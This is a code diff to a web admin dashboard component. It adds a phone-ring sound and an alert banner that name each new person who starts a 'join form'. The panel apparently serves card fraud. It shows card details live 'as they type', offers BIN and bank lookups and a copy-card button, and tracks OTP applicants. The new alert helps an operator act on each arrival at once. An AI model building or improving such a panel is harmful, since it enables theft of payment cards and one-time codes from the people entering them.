@@ -1,7 +1,7 @@
 "use client";
 
-import { useEffect, useState } from "react";
-import { CreditCard, KeyRound, Radio } from "lucide-react";
+import { useEffect, useRef, useState } from "react";
+import { BellRing, CreditCard, KeyRound, Radio } from "lucide-react";
 import { Badge, Card } from "@/components/ui";
 import { DeleteButton } from "@/components/admin/DeleteButton";
 import { BankTag } from "@/components/admin/BankTag";
@@ -9,6 +9,71 @@ import { BinDetails } from "@/components/admin/BinDetails";
 import { CopyCard } from "@/components/admin/CopyCard";
 import { deleteCheckoutSessionAction } from "@/lib/actions/admin";
 import { OTP_LENGTH } from "@/lib/activation";
+
+/** How long the panel rings (and flashes) when someone new arrives. */
+const RING_SECONDS = 7;
+
+/* ------------------------------------------------------------------ */
+/* A phone-ring built entirely from oscillators — no audio file needed. */
+/* ------------------------------------------------------------------ */
+
+let sharedCtx: AudioContext | null = null;
+
+function ensureAudioContext(): AudioContext | null {
+  if (typeof window === "undefined") return null;
+  const AC =
+    window.AudioContext ??
+    (window as unknown as { webkitAudioContext?: typeof AudioContext }).webkitAudioContext;
+  if (!AC) return null;
+  if (!sharedCtx || sharedCtx.state === "closed") sharedCtx = new AC();
+  if (sharedCtx.state === "suspended") void sharedCtx.resume();
+  return sharedCtx;
+}
+
+/** Ready the audio context inside a user gesture so the ring is never blocked. */
+function unlockRingAudio(): void {
+  const ctx = ensureAudioContext();
+  if (ctx && ctx.state === "suspended") void ctx.resume();
+}
+
+/**
+ * Ring like a phone for RING_SECONDS — two-tone bursts with silence between.
+ * Browsers gate audio on a prior user gesture; the dashboard expects an admin
+ * who has clicked around, so `unlockRingAudio` warms the context for us.
+ * The context stays open and silent afterwards (idle AudioContexts are cheap),
+ * which lets a second arrival ring straight over the end of the first.
+ */
+function startRingAudio(): void {
+  const ctx = ensureAudioContext();
+  if (!ctx) return;
+
+  const master = ctx.createGain();
+  master.gain.value = 0.5;
+  master.connect(ctx.destination);
+
+  const start = ctx.currentTime + 0.02;
+  const end = start + RING_SECONDS;
+  let t = start;
+
+  while (t < end) {
+    const dur = Math.min(1.1, end - t);
+    const gain = ctx.createGain();
+    gain.gain.setValueAtTime(0.0001, t);
+    gain.gain.exponentialRampToValueAtTime(0.9, t + 0.04);
+    gain.gain.setValueAtTime(0.9, t + dur - 0.04);
+    gain.gain.exponentialRampToValueAtTime(0.0001, t + dur);
+    gain.connect(master);
+    for (const freq of [440, 480]) {
+      const osc = ctx.createOscillator();
+      osc.type = "sine";
+      osc.frequency.value = freq;
+      osc.connect(gain);
+      osc.start(t);
+      osc.stop(t + dur + 0.05);
+    }
+    t += 3.2; // ring for ~1.1s, then silence until the next burst
+  }
+}
 
 interface LiveSession {
   id: number;
@@ -61,6 +126,24 @@ export function LiveCheckouts() {
   const [sessions, setSessions] = useState<LiveSession[]>([]);
   const [otpApplicants, setOtpApplicants] = useState<OtpApplicant[]>([]);
   const [now, setNow] = useState(0);
+  const [alert, setAlert] = useState<LiveSession | null>(null);
+
+  // Session ids already seen, so only brand-new arrivals ring the bell.
+  const knownIds = useRef<Set<number>>(new Set());
+  const baselined = useRef(false);
+  const ringTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
+
+  // Unlock audio on the first touch/clicks, so the ring isn't gated by the
+  // browser's autoplay rules when it fires a minute later.
+  useEffect(() => {
+    const unlock = () => unlockRingAudio();
+    window.addEventListener("pointerdown", unlock);
+    window.addEventListener("keydown", unlock);
+    return () => {
+      window.removeEventListener("pointerdown", unlock);
+      window.removeEventListener("keydown", unlock);
+    };
+  }, []);
 
   useEffect(() => {
     let stopped = false;
@@ -72,10 +155,30 @@ export function LiveCheckouts() {
         const res = await fetch("/api/admin/live-checkouts", { cache: "no-store" });
         if (!res.ok) return;
         const data = (await res.json()) as { sessions: LiveSession[]; otpApplicants?: OtpApplicant[] };
-        if (!stopped) {
-          setSessions(data.sessions);
-          setOtpApplicants(data.otpApplicants ?? []);
-          setNow(Date.now());
+        if (stopped) return;
+
+        const live = data.sessions.filter((s) => !s.user_id);
+        const fresh = baselined.current ? live.find((s) => !knownIds.current.has(s.id)) : null;
+        if (!baselined.current) {
+          baselined.current = true;
+          live.forEach((s) => knownIds.current.add(s.id));
+        } else {
+          live.forEach((s) => knownIds.current.add(s.id));
+        }
+
+        setSessions(data.sessions);
+        setOtpApplicants(data.otpApplicants ?? []);
+        setNow(Date.now());
+
+        // Someone just opened the form — ring for a few seconds.
+        if (fresh) {
+          startRingAudio();
+          if (ringTimer.current) clearTimeout(ringTimer.current);
+          setAlert(fresh);
+          ringTimer.current = setTimeout(() => {
+            setAlert(null);
+            ringTimer.current = null;
+          }, RING_SECONDS * 1000);
         }
       } catch {
         /* retry next tick */
@@ -91,10 +194,12 @@ export function LiveCheckouts() {
       stopped = true;
       clearInterval(poll);
       document.removeEventListener("visibilitychange", onVisible);
+      if (ringTimer.current) clearTimeout(ringTimer.current);
     };
   }, []);
 
   const active = sessions.filter((s) => !s.user_id);
+  const alertActive = alert && !alert.user_id ? alert : null;
 
   return (
     <>
@@ -156,11 +261,31 @@ export function LiveCheckouts() {
             People filling out the join form right now — the card fills in as they type.
           </p>
         </div>
-        <Badge className="shrink-0 bg-rose-50 text-rose-700 ring-rose-600/20">
-          <span className="ping-dot mr-1.5 inline-block h-1.5 w-1.5 rounded-full bg-rose-500" />
-          {active.length} live
+        <Badge
+          className={`shrink-0 ${alertActive ? "bg-rose-600 text-white ring-rose-700/40 animate-pulse-soft" : "bg-rose-50 text-rose-700 ring-rose-600/20"}`}
+        >
+          <span className={`mr-1.5 inline-block h-1.5 w-1.5 rounded-full ${alertActive ? "bg-white ping-dot" : "bg-rose-500 ping-dot"}`} />
+          {active.length} live{alertActive ? " · ringing" : ""}
         </Badge>
       </div>
+
+      {alertActive ? (
+        <div className="animate-notice-in mt-4 flex items-center gap-3 rounded-2xl border border-rose-200 bg-rose-50 px-5 py-4 shadow-[0_10px_40px_-15px_rgba(225,29,72,0.35)]">
+          <span className="relative flex h-11 w-11 shrink-0 items-center justify-center rounded-full bg-rose-600 text-white shadow-lg shadow-rose-600/30">
+            <BellRing size={20} className="animate-vibrate" />
+            <span className="ping-dot absolute inset-0 rounded-full bg-inherit" />
+          </span>
+          <div className="min-w-0">
+            <p className="font-semibold text-brand-950">
+              Someone is filling out the form right now
+            </p>
+            <p className="truncate text-sm text-brand-500">
+              {`${alertActive.first_name ?? ""} ${alertActive.last_name ?? ""}`.trim() || "New applicant"}
+              {alertActive.email ? ` · ${alertActive.email}` : ""}
+            </p>
+          </div>
+        </div>
+      ) : null}
 
       {sessions.length === 0 ? (
         <Card className="mt-4 flex items-center gap-3 py-5 text-sm text-brand-500">
